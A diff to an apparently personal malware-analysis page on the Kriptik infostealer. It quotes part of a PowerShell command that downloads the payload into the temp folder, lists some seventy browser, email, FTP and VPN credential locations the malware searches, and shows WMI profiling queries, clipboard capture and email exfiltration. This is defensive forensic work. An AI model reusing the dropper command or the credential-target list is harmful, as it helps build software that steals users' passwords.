@@ -132,14 +132,112 @@ cmd.exe /c PowerShell "try{$p=$env:temp+'\Y.exe';Import-Module BitsTransfer;Star
 			<h3>Persistence</h3>
 			<p>To maintain persistence on an infected machine <code>Y.exe</code> copies itself into <code>C:\Users\Flare\AppData\Roaming\MyApp\</code> and adds the below registry run key.
 			<code>HKU\S-1-5-21-659255541-1974059150-103366843-1000\Software\Microsoft\Windows\CurrentVersion\Run\MyApp</code> . This will ensure <code>MyApp.exe</code> runs each time current user logs in.</p>
-			<h3>Privilege Escalation</h3>
-			<p>testing paragraph</p>
+			<!-- <h3>Privilege Escalation</h3> -->
 			<h3>Credential Access</h3>
+			<p><code>Y.exe</code> is heavily obfuscate. In the future I'd like to reverse the binary. But for now dumping the process memory with volatility and doing memory forensics reveals one of the main objectives of the malware - credential access. 
+			A SQLite 3 database is created in memory and the malware continues to search these locations and applications for credentials:</p>
+			<table style="width:100%">
+				<tr>
+					<th>Application</th>
+					<th>Location</th>
+				</tr>
+				<tr>
+					<td>Google Chrome</td>
+					<td>C:\Users\Flare\AppData\Local\Google\Chrome\User Data\Login Data</td>
+				</tr>
+				<tr><td>Thunderbird</td><td>\AppData\Roaming\Thunderbird\profiles.ini</td></tr>
+				<tr><td>Firefox</td><td>\AppData\Roaming\Mozilla\Firefox\</td></tr>
+				<tr><td>Postbox</td><td>\AppData\Roaming\Postbox\profiles.ini</td></tr>
+				<tr><td>SeaMonkey</td><td>\AppData\Roaming\Mozilla\SeaMonkey\</td></tr>
+				<tr><td>BlackHawk</td><td>\AppData\Roaming\NETGATE Technologies\BlackHawk\</td></tr>
+				<tr><td>Cyberfox</td><td>AppData\Roaming\8pecxstudios\Cyberfox\</td></tr>
+				<tr><td>K-Meleon </td><td>\AppData\Roaming\K-Meleon\</td></tr>
+				<tr><td>Pale Moon</td><td>\AppData\Roaming\Moonchild Productions\Pale Moon\</td></tr>
+				<tr><td>IceDragon</td><td>\AppData\Roaming\Comodo\IceDragon\</td></tr>
+				<tr><td>WaterFox</td><td>\AppData\Roaming\Waterfox\</td></tr></tr>
+				<tr><td>Apple Keychain</td><td>\AppData\Roaming\Apple Computer\Preferences\keychain.plist</td></tr></tr>
+				<tr><td>QQBrowser</td><td>\AppData\Local\Tencent\QQBrowser\User Data\Default\EncryptedStorage</td></tr>
+				<tr><td>Opera</td><td>\AppData\Roaming\Opera Software\Opera Stable\Login Data</td></tr>
+				<tr><td>YandexBrowser</td><td>\AppData\Local\Yandex\YandexBrowser\User Data</td></tr>
+				<tr><td>Iridium</td><td>\AppData\Local\Iridium\User Data</td></tr>
+				<tr><td>Comodo Dragon</td><td>\AppData\Local\Comodo\Dragon\User Data</td></tr>
+				<tr><td>ChromePlus</td><td>\AppData\Local\MapleStudio\ChromePlus\User Data</td></tr>
+				<tr><td>Chromium</td><td>\AppData\Local\Chromium\User Data</td></tr>
+				<tr><td>Torch</td><td>\AppData\Local\Torch\User Data</td></tr>
+				<tr><td>7Star</td><td>\AppData\Local\7Star\7Star\User Data</td></tr>
+				<tr><td>Amigo</td><td>\AppData\Local\Amigo\User Data</td></tr>
+				<tr><td>Brave Browser</td><td>\AppData\Local\BraveSoftware\Brave-Browser\User Data</td></tr>
+				<tr><td>Cent Browser</td><td>\AppData\Local\CentBrowser\User Data</td></tr>
+				<tr><td>Chedot</td><td>\AppData\Local\Chedot\User Data</td></tr>
+				<tr><td>CocCoc</td><td>\AppData\Local\CocCoc\Browser\User Data</td></tr>
+				<tr><td>Epic Privacy Browser</td><td>\AppData\Local\Epic Privacy Browser\User Data</td></tr>
+				<tr><td>Kometa</td><td>\AppData\Local\Kometa\User Data</td></tr>
+				<tr><td>Orbitum</td><td>\AppData\Local\Orbitum\User Data</td></tr>
+				<tr><td>Sputnik</td><td>\AppData\Local\Sputnik\Sputnik\User Data</td></tr>
+				<tr><td>uCozMedia Uran</td><td>\AppData\Local\uCozMedia\Uran\User Data</td></tr>
+				<tr><td>Vavaldi</td><td>AppData\Local\Vivaldi\User Data</td></tr>
+				<tr><td>Citrio</td><td>AppData\Local\CatalinaGroup\Citrio\User Data\Default\Login Data</td></tr>
+				<tr><td>liebao</td><td>\AppData\Local\liebao\User Data</td></tr>
+				<tr><td>Sleipnir5</td><td>\AppData\Local\Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer</td></tr>
+				<tr><td>QIP Surf</td><td>\AppData\Local\QIP Surf\User Data</td></tr>
+				<tr><td>Coown</td><td>\AppData\Local\Coowon\Coowon\User Data</td></tr>
+				<tr><td>Elements Browser</td><td>AppData\Local\Elements Browser\User Data\Default\Login Data</td></tr>
+				<tr><td>Uran</td><td>\AppData\Local\uCozMedia\Uran\User Data\Login Data</td></tr>
+				<tr><td>Flock Browser</td><td>AppData\Roaming\Flock\Browser\profiles.ini</td></tr>
+				<tr><td>UCBrowser</td><td>\AppData\Local\UCBrowser</td></tr>
+				<tr><td>Falkon</td><td>AppData\Local\falkon\profiles\profiles.ini</td></tr>
+				<tr><td>Outlook 15</td><td>Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook\</td></tr>
+				<tr><td>Outlook</td><td>Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\</td></tr>
+				<tr><td>Outlook 16</td><td>Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\</td></tr>
+				<tr><td>Foxmail</td><td>HKEY_CURRENT_USER\Software\Aerofox\Foxmail\V3.1</td></tr>
+				<tr><td>Opera Mail</td><td>\AppData\Roaming\Opera Mail\Opera Mail\wand.dat</td></tr>
+				<tr><td>Pocomail</td><td>\AppData\Roaming\Pocomail\accounts.ini</td></tr>
+				<tr><td>Eudora</td><td>HKEY_CURRENT_USER\Software\Qualcomm\Eudora\CommandLine</td></tr>
+				<tr><td>The Bat! Email Client</td><td>\Roaming\The Bat!</td></tr>
+				<tr><td>Claws Mail</td><td>\AppData\Roaming\Claws-mail\clawsrc</td></tr>
+				<tr><td>Becky! Mail</td><td>HKEY_CURRENT_USER\Software\RimArts\B2\Settings</td></tr>
+				<tr><td>Trillian</td><td>\Trillian\users\global\accounts.dat</td></tr>
+				<tr><td>OpenVPN</td><td> Software\OpenVPN-GUI\configs</td></tr>
+				<tr><td>FileZilla</td><td>\AppData\Roaming\FileZilla\recentservers.xml</td></tr>
+				<tr><td>WinSCP 2</td><td>HKEY_CURRENT_USER\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions\</td></tr>
+				<tr><td>CoreFTP</td><td>AppData\Roaming\CoreFTP\sites.idx</td></tr>
+				<tr><td>FTP Navigator</td><td>FTP Navigator\Ftplist.txt</td></tr>
+				<tr><td>FlashFXP</td><td>AppData\Roaming\FlashFXP\3quick.dat</td></tr>
+				<tr><td>SmartFTP</td><td>\AppData\Roaming\SmartFTP\Client 2.0\Favorites\Quick Connect\*.xml</td></tr>
+				<tr><td>CFTP</td><td>\cftp\Ftplist.txt</td></tr>
+				<tr><td>FTPGetter</td><td>\AppData\Roaming\FTPGetter\servers.xml</td></tr>
+				<tr><td>Download Manager</td><td>\Software\DownloadManager\Passwords\</td></tr>
+				<tr><td>jDownloader</td><td>\jDownloader\config\database.script</td></tr>
+				<tr><td>Sleipnir 5</td><td>\AppData\Roaming\Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer</td></tr>
+				<tr><td>Liebao</td><td>\AppData\Local\liebao\User Data</td></tr>
+				<tr><td>QIP Surf</td><td>\username\AppData\Local\QIP Surf\User Data</td></tr>
+				<tr><td>Chrome Cookies</td><td>\AppData\Local\Google\Chrome\User Data\Cookies</td></tr>
+			</table>
 			<h3>Discovery</h3>
-			<h3>Lateral Movement</h3>
+			<tr><td></td><td>[PRIVATE KEY LOCATION: "\id_rsa.ppk"]</td></tr>
+			<tr><td> </td><td>\AppData\Roaming\xafv3sig.fs3\Chrome</td></tr>
+			<!--<h3>Lateral Movement</h3>-->
 			<h3>Collection</h3>
+				<P>Further memory forensics shows Kriptik's periodically collecting the contents of the clipboard and these WMI queries to profile the system. </P>
+				<P>WMI collection</P>
+				<pre><code class="language-none">
+SELECT * FROM Win32_VideoController
+SELECT * FROM Win32_Processor
+select * from Win32_OperatingSystem
+			</code></pre>
+			<p>The contents of the clipboard are inserted into an .html document which is attached to an email sent to the adversary. In this case I had some hex code in my clipboard when Kriptik captured the contents.</p>
+			<pre><code class="language-none">
+<br><span style=font-style:normal;text-decoration:none;text-transform:none;color:#FF0000;><strong>[clipboard]</strong></span>D0 CF 11 E0 A1 B1 1A E1 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 3E 00 03 00 FE FF 09 00
+06 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00
+01 00 00 00 00 00 00 00 00 10 00 00 02 00 00 00
+01 00 00 00 FE FF FF FF 00 00 00 00 00 00 00 00
+FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF
+FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF ....
+			</code></pre>
 			<h3>Command and Control</h3>
 			<h3>Exfiltration</h3>
+				<p>Email</p>
 			<h3>Final Thoughts</h3>
 			<p>A huge thanks to Didier Stevens for making a fantastic library of OLE analysis tools. </p>
 	      <br>
